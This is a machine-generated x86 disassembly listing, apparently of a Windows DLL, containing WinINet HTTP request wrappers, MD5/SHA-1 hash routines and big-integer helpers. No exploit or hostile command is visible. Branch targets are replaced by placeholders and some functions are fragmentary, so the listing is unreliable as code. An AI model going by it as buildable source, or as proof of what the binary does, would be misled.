push edi
push ecx
call [ InternetConnectW@IAT ]
push r--data
lea ecx [ ebp - 0x28 ]
mov edi eax
call sub_10001c7f
lea eax [ ebp - 0x28 ]
push eax
cmp edi esi
sete al
movzx eax al
push eax
mov [ ebp - 0x4 ] esi
call sub_10014ddd
pop ecx
pop ecx
push esi
push 0x1
lea ecx [ ebp - 0x28 ]
call sub_10002020
mov eax edi
call sub_100282db
retn
sub_10018662
push 0x24
mov eax sub_1004de30
call sub_10028203
mov edi ecx
mov esi edx
call sub_100188bf
mov esi [ ebp + 0xc ]
mov ebx eax
call sub_100188bf
mov esi [ ebp + 0x10 ]
mov [ ebp - 0x14 ] eax
call sub_100188bf
mov esi [ ebp + 0x14 ]
mov [ ebp - 0x10 ] eax
call sub_100188bf
cmp [ edi + 0x18 ] 0x8
jb r-xdata
add edi 0x4
mov edi [ edi + 0x4 ]
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + 0x4 ]
xor esi esi
push esi
push esi
push eax
push [ ebp - 0x10 ]
push [ ebp - 0x14 ]
push edi
push ebx
push ecx
call [ HttpOpenRequestW@IAT ]
push r--data
lea ecx [ ebp - 0x30 ]
mov edi eax
call sub_10001c7f
lea eax [ ebp - 0x30 ]
push eax
cmp edi esi
sete al
movzx eax al
push eax
mov [ ebp - 0x4 ] esi
call sub_10014ddd
pop ecx
pop ecx
push esi
push 0x1
lea ecx [ ebp - 0x30 ]
call sub_10002020
mov eax edi
call sub_100282db
retn
sub_100186f8
push 0x20
mov eax sub_1004e168
call sub_10028203
mov esi ecx
call sub_100188bf
push [ ebp + 0x10 ]
mov esi [ esi + 0x14 ]
push [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + 0x4 ]
push esi
push eax
push ecx
call [ HttpSendRequestW@IAT ]
push r--data
lea ecx [ ebp - 0x28 ]
mov esi eax
call sub_10001c7f
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x28 ]
push eax
cmp esi 0x1
setne al
movzx eax al
push eax
call sub_10014ddd
pop ecx
pop ecx
push 0x0
push 0x1
lea ecx [ ebp - 0x28 ]
call sub_10002020
call sub_100282db
retn 0xc
sub_1001875f
push 0x20
mov eax sub_1004d236
call sub_10028203
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x4 ]
and [ ebp - 0x10 ] 0x0
lea ecx [ ebp - 0x10 ]
push ecx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call [ InternetReadFile@IAT ]
push r--data
lea ecx [ ebp - 0x2c ]
mov edi eax
call sub_10001c7f
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x2c ]
push eax
cmp edi 0x1
setne al
movzx eax al
push eax
call sub_10014ddd
pop ecx
pop ecx
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_10002020
mov eax [ ebp - 0x10 ]
call sub_100282db
retn 0xc
sub_100187c5
push 0x28
mov eax sub_1004e59c
call sub_10028203
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x4 ]
and [ ebp - 0x10 ] 0x0
push 0x0
lea ecx [ ebp - 0x14 ]
push ecx
lea ecx [ ebp - 0x10 ]
push ecx
push 0x20000013
push eax
mov [ ebp - 0x14 ] 0x4
call [ HttpQueryInfoW@IAT ]
push r--data
lea ecx [ ebp - 0x30 ]
mov edi eax
call sub_10001c7f
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x30 ]
push eax
cmp edi 0x1
setne al
movzx eax al
push eax
call sub_10014ddd
pop ecx
pop ecx
push 0x0
push 0x1
lea ecx [ ebp - 0x30 ]
call sub_10002020
mov eax [ ebp - 0x10 ]
call sub_100282db
retn 0x4
sub_10018837
push 0x48
mov eax sub_1004d16e
call sub_10028203
mov eax [ ebp + 0x8 ]
mov [ eax ] r--data
mov [ eax + 0x4 ] ecx
test ecx ecx
jne r-xdata
call sub_100282db
retn 0x4
push r--data
lea ecx [ ebp - 0x2c ]
call sub_10001c7f
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x2c ]
push eax
lea ecx [ ebp - 0x54 ]
call sub_10002075
push r--data
lea eax [ ebp - 0x54 ]
push eax
call sub_10027dd1
sub_100188de
push 0x1c
mov eax sub_1004dff5
call sub_10028203
push [ ebp + 0x14 ]
mov eax [ ebp + 0x8 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ eax + 0x4 ]
call [ InternetSetOptionW@IAT ]
push r--data
lea ecx [ ebp - 0x28 ]
mov esi eax
call sub_10001c7f
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x28 ]
push eax
cmp esi 0x1
setne al
movzx eax al
push eax
call sub_10014ddd
pop ecx
pop ecx
push 0x0
push 0x1
lea ecx [ ebp - 0x28 ]
call sub_10002020
call sub_100282db
retn 0x10
sub_10018941
mov [ eax ] ecx
dec ecx
dec ecx
je r-xdata
lea ecx [ eax + 0x4 ]
and [ ecx + 0x20 ] 0x0
push edi
xor eax eax
mov edi ecx
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
xor eax eax
lea edi [ ecx + 0x10 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
pop edi
dec ecx
je r-xdata
and [ eax + 0x1c ] 0x0
and [ eax + 0x18 ] 0x0
mov [ eax + 0x4 ] 0x67452301
mov [ eax + 0x8 ] 0xefcdab89
mov [ eax + 0xc ] 0x98badcfe
mov [ eax + 0x10 ] 0x10325476
mov [ eax + 0x14 ] 0xc3d2e1f0
jmp r-xdata
dec ecx
je r-xdata
xor eax eax
retn
and [ eax + 0x18 ] 0x0
and [ eax + 0x14 ] 0x0
mov [ eax + 0x4 ] 0x67452301
mov [ eax + 0x8 ] 0xefcdab89
mov [ eax + 0xc ] 0x98badcfe
mov [ eax + 0x10 ] 0x10325476
jmp r-xdata
dec ecx
je r-xdata
add eax 0x4
call sub_10018be1
jmp r-xdata
mov eax 0x402
retn
sub_100189d0
push esi
mov esi edx
mov edx [ ecx ]
dec edx
dec edx
je r-xdata
push esi
lea esi [ ecx + 0x4 ]
call sub_1001b7d1
dec edx
je r-xdata
push eax
push esi
lea eax [ ecx + 0x4 ]
call sub_10019ba1
pop ecx
jmp r-xdata
dec edx
je r-xdata
pop ecx
xor eax eax
pop esi
retn
push esi
lea esi [ ecx + 0x4 ]
call sub_1001b959
jmp r-xdata
dec edx
je r-xdata
push esi
lea esi [ ecx + 0x4 ]
call sub_10018c05
jmp r-xdata
mov eax 0x402
pop esi
retn
sub_10018a1a
mov ecx [ eax ]
xor edx edx
cmp ecx 0x3
sete dl
push ebx
push esi
mov esi [ esp + 0xc ]
dec ecx
dec ecx
lea edx [ edx * 4 + 0x10 ]
mov [ esi ] edx
je r-xdata
add eax 0x4
push edi
call sub_1001b86b
dec ecx
je r-xdata
lea esi [ eax + 0x4 ]
push edi
call sub_10019c85
jmp r-xdata
dec ecx
je r-xdata
pop ecx
lea ecx [ eax + 0x4 ]
mov ebx edi
call sub_1001b9fe
jmp r-xdata
dec ecx
je r-xdata
xor eax eax
lea ecx [ eax + 0x4 ]
mov ebx edi
call sub_10018caa
jmp r-xdata
mov eax 0x402
jmp r-xdata
pop esi
pop ebx
retn
sub_10018a79
push ebp
lea ebp [ esp - 0x70 ]
sub esp 0xc0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp + 0x6c ] eax
push edi
xor edi edi
cmp [ ebp + 0x7c ] 0x80
jbe r-xdata
cmp [ esi ] 0x3
jne r-xdata
mov edi 0x406
test edi edi
jne r-xdata
mov edi 0x402
mov ecx [ ebp + 0x6c ]
mov eax edi
xor ecx ebp
pop edi
call sub_100242d7
add ebp 0x70
leave
retn
lea eax [ ebp - 0x50 ]
push eax
lea edi [ ebp + 0x58 ]
mov eax esi
call sub_10018a1a
mov edi eax
pop ecx
test edi edi
jne r-xdata
mov ecx [ esi ]
lea eax [ ebp + 0x58 ]
push eax
lea eax [ ebp + 0x34 ]
call sub_10018b92
push [ ebp + 0x7c ]
lea eax [ ebp - 0x50 ]
push [ ebp + 0x78 ]
mov ecx ebx
push eax
lea eax [ ebp - 0x4c ]
push eax
call sub_1001b61f
add esp 0x14
test eax eax
je r-xdata
cmp [ ebp - 0x50 ] 0x22
jne r-xdata
mov edi 0x40a
jmp r-xdata
mov edi 0x40b
mov al [ ebp - 0x3f ]
cmp al [ ebp + 0x41 ]
jne r-xdata
push 0x22
lea eax [ ebp + 0x34 ]
lea ecx [ ebp - 0x4c ]
call sub_100193ca
pop ecx
test eax eax
jne r-xdata
mov ecx [ esi ]
mov eax esi
call sub_10018941
jmp r-xdata
sub_10018b35
push ebp
mov ebp esp
sub esp 0x6c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x8 ] eax
push ebx
push esi
mov ebx ecx
push 0x5
pop ecx
lea eax [ ebp - 0x6c ]
call sub_10018941
test eax eax
jne r-xdata
mov ecx [ ebp - 0x8 ]
pop esi
xor ecx ebp
pop ebx
call sub_100242d7
leave
retn
cmp [ ebp - 0x6c ] 0x3
jne r-xdata
mov eax [ ebp + 0x8 ]
lea ecx [ ebp - 0x6c ]
call sub_100189d0
test eax eax
jne r-xdata
mov eax 0x402
jmp r-xdata
push [ ebp + 0x10 ]
lea esi [ ebp - 0x6c ]
push [ ebp + 0xc ]
call sub_10018a79
pop ecx
pop ecx
sub_10018b92
cmp ecx 0x3
je r-xdata
retn
push esi
push edi
mov [ eax + 0xd ] cl
mov ecx rw-data
push 0x4
lea edx [ eax + 0xe ]
pop edi
mov esi ecx
sub edx ecx
mov cl [ esi ]
mov [ edx + esi ] cl
inc esi
dec edi
jne r-xdata
push 0xd
mov ecx rw-data
mov esi eax
pop edi
sub esi ecx
mov dl [ ecx ]
mov [ esi + ecx ] dl
inc ecx
dec edi
jne r-xdata
mov ecx [ esp + 0xc ]
push 0x10
add eax 0x12
pop esi
sub eax ecx
mov dl [ ecx ]
mov [ eax + ecx ] dl
inc ecx
dec esi
jne r-xdata
pop edi
pop esi
sub_10018c05
push ebp
mov ebp esp
push ecx
mov ecx [ esi + 0x10 ]
push edi
mov edi eax
mov eax ecx
shr eax 0x3
mov edx edi
lea ecx [ ecx + edi * 8 ]
shl edx 0x3
and eax 0x3f
mov [ esi + 0x10 ] ecx
cmp ecx edx
jae r-xdata
push ebx
push 0x40
mov ecx edi
shr ecx 0x1d
add [ esi + 0x14 ] ecx
pop ebx
sub ebx eax
cmp edi ebx
jb r-xdata
inc [ esi + 0x14 ]
xor ebx ebx
mov ecx [ ebp + 0x8 ]
mov [ ebp - 0x4 ] ebx
lea eax [ eax + esi + 0x18 ]
test ebx ebx
je r-xdata
pop edi
leave
retn
sub eax ecx
lea ecx [ esi + 0x18 ]
push esi
call sub_10018d1f
lea eax [ ebx + 0x3f ]
pop ecx
cmp eax edi
jae r-xdata
sub eax ecx
mov dl [ ecx ]
mov [ eax + ecx ] dl
inc ecx
dec edi
jne r-xdata
xor eax eax
jmp r-xdata
mov [ ebp - 0x4 ] eax
mov dl [ ecx ]
mov [ eax + ecx ] dl
inc ecx
dec [ ebp - 0x4 ]
jne r-xdata
mov ecx [ ebp + 0x8 ]
sub edi ebx
lea ecx [ ebx + ecx ]
lea eax [ eax + esi + 0x18 ]
pop ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x4 ]
lea ecx [ eax + ecx - 0x3f ]
push esi
call sub_10018d1f
add [ ebp - 0x4 ] 0x40
add ebx 0x40
pop ecx
cmp [ ebp - 0x4 ] edi
jb r-xdata
sub_10018caa
push ebp
mov ebp esp
sub esp 0xc
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
push edi
mov esi ecx
lea edi [ esi + 0x10 ]
push 0x8
pop edx
mov eax edi
lea ecx [ ebp - 0xc ]
call sub_1001bedd
mov ecx [ edi ]
shr ecx 0x3
push 0x38
and ecx 0x3f
pop eax
cmp ecx eax
jb r-xdata
sub eax ecx
push rw-data
call sub_10018c05
lea eax [ ebp - 0xc ]
push eax
push 0x8
pop eax
call sub_10018c05
push 0x10
pop edx
mov eax esi
mov ecx ebx
call sub_1001bedd
push 0x58
push 0x0
push esi
call sub_10024b80
mov ecx [ ebp - 0x4 ]
add esp 0x14
pop edi
xor ecx ebp
pop esi
call sub_100242d7
leave
retn
push 0x78
pop eax
sub_10018d1f
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
sub esp 0x48
push ebx
push esi
push edi
push 0x10
add ecx 0x2
lea edx [ ebp - 0x48 ]
pop esi
movzx edi [ ecx + 0x1 ]
movzx ebx [ ecx ]
shl edi 0x8
or edi ebx
movzx ebx [ ecx - 0x1 ]
shl edi 0x8
or edi ebx
movzx ebx [ ecx - 0x2 ]
shl edi 0x8
or edi ebx
mov [ edx ] edi
add edx 0x4
add ecx 0x4
dec esi
jne r-xdata
mov esi [ eax + 0x4 ]
mov edx [ eax + 0x8 ]
mov ecx [ eax + 0xc ]
mov eax [ eax ]
mov edi esi
not edi
and edi ecx
mov ebx edx
and ebx esi
or edi ebx
add edi [ ebp - 0x48 ]
mov ebx esi
lea eax [ edi + eax - 0x28955b88 ]
rol eax 0x7
add eax esi
and ebx eax
mov edi eax
not edi
and edi edx
or edi ebx
add edi [ ebp - 0x44 ]
lea ecx [ edi + ecx - 0x173848aa ]
rol ecx 0xc
add ecx eax
mov edi ecx
not edi
and edi esi
mov ebx ecx
and ebx eax
or edi ebx
add edi [ ebp - 0x40 ]
mov ebx ecx
lea edx [ edi + edx + 0x242070db ]
ror edx 0xf
add edx ecx
and ebx edx
mov edi edx
not edi
and edi eax
or edi ebx
add edi [ ebp - 0x3c ]
lea esi [ edi + esi - 0x3e423112 ]
ror esi 0xa
add esi edx
mov [ ebp - 0x4 ] esi
mov edi edx
and edi [ ebp - 0x4 ]
not esi
and esi ecx
or esi edi
add esi [ ebp - 0x38 ]
lea eax [ esi + eax - 0xa83f051 ]
mov esi [ ebp - 0x4 ]
rol eax 0x7
add eax esi
mov edi eax
not edi
and edi edx
mov ebx esi
and ebx eax
or edi ebx
add edi [ ebp - 0x34 ]
lea ecx [ edi + ecx + 0x4787c62a ]
rol ecx 0xc
add ecx eax
mov edi ecx
not edi
and edi esi
mov ebx ecx
and ebx eax
or edi ebx
add edi [ ebp - 0x30 ]
mov ebx ecx
lea edx [ edi + edx - 0x57cfb9ed ]
ror edx 0xf
add edx ecx
mov edi edx
not edi
and edi eax
and ebx edx
or edi ebx
add edi [ ebp - 0x2c ]
lea esi [ edi + esi - 0x2b96aff ]
ror esi 0xa
add esi edx
mov [ ebp - 0x4 ] esi
not esi
and esi ecx
mov edi edx
and edi [ ebp - 0x4 ]
or esi edi
add esi [ ebp - 0x28 ]
lea eax [ esi + eax + 0x698098d8 ]
mov esi [ ebp - 0x4 ]
mov ebx esi
rol eax 0x7
add eax esi
and ebx eax
mov edi eax
not edi
and edi edx
or edi ebx
add edi [ ebp - 0x24 ]
lea ecx [ edi + ecx - 0x74bb0851 ]
rol ecx 0xc
add ecx eax
mov edi ecx
not edi
and edi esi
mov ebx ecx
and ebx eax
or edi ebx
add edi [ ebp - 0x20 ]
mov ebx ecx
lea edx [ edi + edx - 0xa44f ]
ror edx 0xf
add edx ecx
and ebx edx
mov edi edx
not edi
and edi eax
or edi ebx
add edi [ ebp - 0x1c ]
lea esi [ edi + esi - 0x76a32842 ]
ror esi 0xa
add esi edx
mov [ ebp - 0x4 ] esi
not esi
and esi ecx
mov edi edx
and edi [ ebp - 0x4 ]
or esi edi
add esi [ ebp - 0x18 ]
mov edi [ ebp - 0x4 ]
lea eax [ esi + eax + 0x6b901122 ]
rol eax 0x7
add eax [ ebp - 0x4 ]
and edi eax
mov esi eax
not esi
and esi edx
or esi edi
add esi [ ebp - 0x14 ]
lea ecx [ esi + ecx - 0x2678e6d ]
rol ecx 0xc
add ecx eax
mov edi ecx
not edi
mov esi edi
and esi [ ebp - 0x4 ]
mov ebx ecx
and ebx eax
or esi ebx
add esi [ ebp - 0x10 ]
mov ebx ecx
lea edx [ esi + edx - 0x5986bc72 ]
ror edx 0xf
add edx ecx
mov [ ebp - 0x8 ] edx
not [ ebp - 0x8 ]
mov esi [ ebp - 0x8 ]
and esi eax
and edi edx
and ebx edx
or esi ebx
add esi [ ebp - 0xc ]
mov ebx [ ebp - 0x4 ]
lea esi [ esi + ebx + 0x49b40821 ]
ror esi 0xa
add esi edx
mov ebx ecx
and ebx esi
or edi ebx
add edi [ ebp - 0x44 ]
mov ebx edx
lea eax [ edi + eax - 0x9e1da9e ]
mov edi [ ebp - 0x8 ]
and edi esi
rol eax 0x5
add eax esi
and ebx eax
or edi ebx
add edi [ ebp - 0x30 ]
lea ecx [ edi + ecx - 0x3fbf4cc0 ]
rol ecx 0x9
add ecx eax
mov edi esi
not edi
and edi eax
mov ebx ecx
and ebx esi
or edi ebx
add edi [ ebp - 0x1c ]
lea edx [ edi + edx + 0x265e5a51 ]
rol edx 0xe
add edx ecx
mov edi eax
not edi
and edi ecx
mov ebx edx
and ebx eax
or edi ebx
add edi [ ebp - 0x48 ]
mov ebx ecx
lea esi [ edi + esi - 0x16493856 ]
ror esi 0xc
add esi edx
and ebx esi
mov edi ecx
not edi
and edi edx
or edi ebx
add edi [ ebp - 0x34 ]
mov ebx edx
lea eax [ edi + eax - 0x29d0efa3 ]
rol eax 0x5
add eax esi
mov edi edx
not edi
and edi esi
and ebx eax
or edi ebx
add edi [ ebp - 0x20 ]
lea ecx [ edi + ecx + 0x2441453 ]
rol ecx 0x9
add ecx eax
mov edi esi
not edi
and edi eax
mov ebx ecx
and ebx esi
or edi ebx
add edi [ ebp - 0xc ]
lea edx [ edi + edx - 0x275e197f ]
rol edx 0xe
add edx ecx
mov edi eax
not edi
mov ebx edx
and edi ecx
and ebx eax
or edi ebx
add edi [ ebp - 0x38 ]
lea esi [ edi + esi - 0x182c0438 ]
ror esi 0xc
add esi edx
mov edi ecx
not edi
and edi edx
mov ebx ecx
and ebx esi
or edi ebx
add edi [ ebp - 0x24 ]
mov ebx edx
lea eax [ edi + eax + 0x21e1cde6 ]
rol eax 0x5
add eax esi
and ebx eax
mov edi edx
not edi
and edi esi
or edi ebx
add edi [ ebp - 0x10 ]
lea ecx [ edi + ecx - 0x3cc8f82a ]
rol ecx 0x9
add ecx eax
mov edi esi
not edi
and edi eax
mov ebx ecx
and ebx esi
or edi ebx
add edi [ ebp - 0x3c ]
lea edx [ edi + edx - 0xb2af279 ]
rol edx 0xe
add edx ecx
mov edi eax
not edi
and edi ecx
mov ebx edx
and ebx eax
or edi ebx
add edi [ ebp - 0x28 ]
mov ebx ecx
lea esi [ edi + esi + 0x455a14ed ]
ror esi 0xc
add esi edx
and ebx esi
mov edi ecx
not edi
and edi edx
or edi ebx
add edi [ ebp - 0x14 ]
mov ebx edx
lea eax [ edi + eax - 0x561c16fb ]
rol eax 0x5
add eax esi
mov edi edx
not edi
and edi esi
and ebx eax
or edi ebx
add edi [ ebp - 0x40 ]
lea ecx [ edi + ecx - 0x3105c08 ]
rol ecx 0x9
add ecx eax
mov edi esi
not edi
and edi eax
mov ebx ecx
and ebx esi
or edi ebx
add edi [ ebp - 0x2c ]
lea edx [ edi + edx + 0x676f02d9 ]
rol edx 0xe
add edx ecx
mov edi eax
not edi
mov ebx edx
and edi ecx
and ebx eax
or edi ebx
add edi [ ebp - 0x18 ]
lea esi [ edi + esi - 0x72d5b376 ]
ror esi 0xc
add esi edx
mov edi ecx
xor edi edx
xor edi esi
add edi [ ebp - 0x34 ]
lea eax [ edi + eax - 0x5c6be ]
rol eax 0x4
add eax esi
mov edi edx
xor edi esi
xor edi eax
add edi [ ebp - 0x28 ]
lea ecx [ edi + ecx - 0x788e097f ]
rol ecx 0xb
add ecx eax
mov edi ecx
xor edi esi
xor edi eax
add edi [ ebp - 0x1c ]
lea edx [ edi + edx + 0x6d9d6122 ]
rol edx 0x10
add edx ecx
mov edi ecx
xor edi edx
mov ebx edi
xor ebx eax
add ebx [ ebp - 0x10 ]
lea esi [ ebx + esi - 0x21ac7f4 ]
ror esi 0x9
add esi edx
xor edi esi
add edi [ ebp - 0x44 ]
lea eax [ edi + eax - 0x5b4115bc ]
rol eax 0x4
add eax esi
mov edi edx
xor edi esi
xor edi eax
add edi [ ebp - 0x38 ]
lea edi [ edi + ecx + 0x4bdecfa9 ]
rol edi 0xb
add edi eax
mov ecx edi
xor ecx esi
xor ecx eax
add ecx [ ebp - 0x2c ]
mov ebx edi
lea edx [ ecx + edx - 0x944b4a0 ]
rol edx 0x10
add edx edi
xor ebx edx
mov ecx ebx
xor ecx eax
add ecx [ ebp - 0x20 ]
lea ecx [ ecx + esi - 0x41404390 ]
ror ecx 0x9
add ecx edx
xor ebx ecx
add ebx [ ebp - 0x14 ]
mov esi edx
lea eax [ ebx + eax + 0x289b7ec6 ]
xor esi ecx
rol eax 0x4
add eax ecx
xor esi eax
add esi [ ebp - 0x48 ]
lea esi [ esi + edi - 0x155ed806 ]
rol esi 0xb
add esi eax
mov edi esi
xor edi ecx
xor edi eax
add edi [ ebp - 0x3c ]
lea edi [ edi + edx - 0x2b10cf7b ]
rol edi 0x10
add edi esi
mov edx esi
xor edx edi
mov ebx edx
xor ebx eax
add ebx [ ebp - 0x30 ]
lea ecx [ ebx + ecx + 0x4881d05 ]
ror ecx 0x9
add ecx edi
xor edx ecx
add edx [ ebp - 0x24 ]
lea eax [ edx + eax - 0x262b2fc7 ]
mov edx edi
xor edx ecx
rol eax 0x4
add eax ecx
xor edx eax
add edx [ ebp - 0x18 ]
lea edx [ edx + esi - 0x1924661b ]
rol edx 0xb
add edx eax
mov esi edx
xor esi ecx
xor esi eax
add esi [ ebp - 0xc ]
lea esi [ esi + edi + 0x1fa27cf8 ]
rol esi 0x10
add esi edx
mov edi edx
xor edi esi
xor edi eax
add edi [ ebp - 0x40 ]
lea ecx [ edi + ecx - 0x3b53a99b ]
ror ecx 0x9
add ecx esi
mov edi edx
not edi
or edi ecx
xor edi esi
add edi [ ebp - 0x48 ]
lea eax [ edi + eax - 0xbd6ddbc ]
rol eax 0x6
add eax ecx
mov edi esi
not edi
or edi eax
xor edi ecx
add edi [ ebp - 0x2c ]
lea edx [ edi + edx + 0x432aff97 ]
rol edx 0xa
add edx eax
mov edi ecx
not edi
or edi edx
xor edi eax
add edi [ ebp - 0x10 ]
lea esi [ edi + esi - 0x546bdc59 ]
rol esi 0xf
add esi edx
mov edi eax
not edi
or edi esi
xor edi edx
add edi [ ebp - 0x34 ]
lea ecx [ edi + ecx - 0x36c5fc7 ]
ror ecx 0xb
add ecx esi
mov edi edx
not edi
or edi ecx
xor edi esi
add edi [ ebp - 0x18 ]
lea eax [ edi + eax + 0x655b59c3 ]
rol eax 0x6
add eax ecx
mov edi esi
not edi
or edi eax
xor edi ecx
add edi [ ebp - 0x3c ]
lea edx [ edi + edx - 0x70f3336e ]
rol edx 0xa
mov edi ecx
add edx eax
not edi
or edi edx
xor edi eax
add edi [ ebp - 0x20 ]
lea esi [ edi + esi - 0x100b83 ]
rol esi 0xf
add esi edx
mov edi eax
not edi
or edi esi
xor edi edx
add edi [ ebp - 0x44 ]
lea ecx [ edi + ecx - 0x7a7ba22f ]
ror ecx 0xb
add ecx esi
mov edi edx
not edi
or edi ecx
xor edi esi
add edi [ ebp - 0x28 ]
lea eax [ edi + eax + 0x6fa87e4f ]
rol eax 0x6
add eax ecx
mov edi esi
not edi
or edi eax
xor edi ecx
add edi [ ebp - 0xc ]
lea edx [ edi + edx - 0x1d31920 ]
mov edi ecx
rol edx 0xa
add edx eax
not edi
or edi edx
xor edi eax
add edi [ ebp - 0x30 ]
lea esi [ edi + esi - 0x5cfebcec ]
mov edi eax
rol esi 0xf
add esi edx
not edi
or edi esi
xor edi edx
add edi [ ebp - 0x14 ]
lea edi [ edi + ecx + 0x4e0811a1 ]
ror edi 0xb
add edi esi
mov ecx edx
not ecx
or ecx edi
xor ecx esi
add ecx [ ebp - 0x38 ]
lea eax [ ecx + eax - 0x8ac817e ]
rol eax 0x6
add eax edi
mov ecx esi
not ecx
or ecx eax
xor ecx edi
add ecx [ ebp - 0x1c ]
lea edx [ ecx + edx - 0x42c50dcb ]
rol edx 0xa
add edx eax
mov ecx edi
not ecx
or ecx edx
xor ecx eax
add ecx [ ebp - 0x40 ]
lea esi [ ecx + esi + 0x2ad7d2bb ]
mov ecx [ ebp + 0x8 ]
mov ebx [ ecx ]
add ebx eax
not eax
rol esi 0xf
add esi edx
or eax esi
xor eax edx
add eax [ ebp - 0x24 ]
mov [ ecx ] ebx
lea eax [ eax + edi - 0x14792c6f ]
ror eax 0xb
add eax [ ecx + 0x4 ]
add eax esi
mov [ ecx + 0x4 ] eax
mov eax [ ecx + 0x8 ]
add eax esi
mov [ ecx + 0x8 ] eax
mov eax [ ecx + 0xc ]
pop edi
add eax edx
pop esi
mov [ ecx + 0xc ] eax
pop ebx
leave
retn
sub_100193ca
push esi
mov esi ecx
movzx ecx [ eax - 0x1 ]
movzx eax [ esi - 0x1 ]
sub eax ecx
pop esi
retn
dec [ esp + 0x8 ]
jne r-xdata
mov dl [ eax ]
mov cl [ esi ]
inc eax
inc esi
cmp cl dl
jne r-xdata
xor eax eax
pop esi
retn
sub_100193ed
push edi
mov edi [ esp + 0x8 ]
xor edx edx
dec eax
push esi
pop esi
cmp edx 0x21
jae r-xdata
xor esi esi
xor ecx ecx
pop edi
retn
push 0x21
pop ecx
sub ecx edx
lea edi [ edi + edx * 4 ]
xor eax eax
[ edi ]
mov edi [ esp + 0xc ]
mov [ edi + edx * 4 ] esi
inc edx
cmp edx 0x21
jb r-xdata
mov edi [ esp + 0x10 ]
movzx edi [ eax + edi ]
shl edi cl
add ecx 0x8
or esi edi
dec eax
test eax eax
jge r-xdata
test eax eax
jl r-xdata
cmp ecx 0x20
jae r-xdata
sub_10019438
push ebp
mov ebp esp
push ebx
push esi
push edi
xor edi edi
dec eax
cmp [ ebp + 0x10 ] edi
jbe r-xdata
test eax eax
jl r-xdata
test eax eax
jl r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov ecx [ ebp + 0x8 ]
mov [ eax + ecx ] 0x0
dec eax
jns r-xdata
mov ecx [ ebp + 0xc ]
mov esi [ ecx + edi * 4 ]
xor ecx ecx
inc edi
cmp edi [ ebp + 0x10 ]
jb r-xdata
mov ebx [ ebp + 0x8 ]
mov edx esi
shr edx cl
add ecx 0x8
mov [ eax + ebx ] dl
dec eax
test eax eax
jge r-xdata
cmp ecx 0x20
jae r-xdata
sub_10019496
push edi
mov edi eax
xor eax eax
cmp [ esp + 0xc ] eax
je r-xdata
pop edi
retn
push ebx
mov eax [ edx ]
or ebx 0xffffffff
sub ecx eax
sub ebx eax
cmp ebx ecx
sbb eax eax
neg eax
or ecx ecx
sub ecx [ edx ]
jmp r-xdata
mov ecx [ edi ]
sub ecx eax
add edi 0x4
cmp ecx 0xffffffff
jne r-xdata
pop ebx
mov ebx [ esp + 0xc ]
add [ esp + 0xc ] 0x4
add edx 0x4
dec [ esp + 0x10 ]
mov [ ebx ] ecx
jne r-xdata
sub_100194da
push ebp
mov ebp esp
sub esp 0x128
push ebx
mov ebx eax
lea eax [ edx + edx ]
push edi
mov [ ebp - 0x1c ] eax
push eax
lea eax [ ebp - 0x128 ]
call sub_10019482
add esp 0x4
test edx edx
je r-xdata
xor edi edi
push ebx
mov eax edx
call sub_10019aa3
pop ecx
mov edi eax
jmp r-xdata
and [ ebp - 0x8 ] 0x0
push [ ebp + 0xc ]
mov eax edx
call sub_10019aa3
pop ecx
mov [ ebp - 0x8 ] eax
jmp r-xdata
test edx edx
je r-xdata
push [ ebp - 0x1c ]
mov eax [ ebp + 0x8 ]
lea ecx [ ebp - 0x128 ]
call sub_10019a8b
pop ecx
pop edi
pop ebx
leave
retn
mov eax [ ebp - 0x8 ]
push esi
lea esi [ ebp - 0x128 ]
lea eax [ ebp + eax * 4 - 0x128 ]
sub esi ebx
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0xc ] eax
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x10 ] edi
test edi edi
jbe r-xdata
add [ eax ] edi
add [ ebp - 0x4 ] 0x4
add eax 0x4
dec [ ebp - 0x10 ]
mov [ ebp - 0xc ] eax
jne r-xdata
cmp [ ebp - 0x8 ] ebx
jbe r-xdata
mov ecx [ ebp - 0x4 ]
xor ebx ebx
xor edi edi
cmp [ ecx ] ebx
je r-xdata
pop esi
mov eax ecx
add esi eax
add edi [ ebp - 0x20 ]
inc ebx
add esi 0x4
cmp ebx [ ebp - 0x8 ]
jb r-xdata
inc edi
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x20 ]
push eax
mov eax [ ebp + 0xc ]
push [ eax + ebx * 4 ]
mov eax [ ebp - 0x4 ]
push [ eax ]
call sub_10019b31
add [ esi ] edi
mov eax [ ebp - 0x14 ]
add esp 0x10
cmp [ esi ] edi
sbb edi edi
add [ esi ] eax
neg edi
cmp [ esi ] eax
jae r-xdata
mov eax [ ebp - 0xc ]
mov esi [ ebp - 0x18 ]
sub_100195c9
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
push ebx
push esi
push edi
push 0x20
pop esi
mov edi eax
mov ebx ecx
cmp [ ebp + 0x8 ] esi
jae r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
leave
retn
cmp [ ebp + 0xc ] 0x0
je r-xdata
sub esi [ ebp + 0x8 ]
mov edx [ edi ]
mov ecx [ ebp + 0x8 ]
mov eax edx
shl eax cl
add edi 0x4
or eax [ ebp - 0x4 ]
mov [ ebx ] eax
mov eax ecx
mov ecx esi
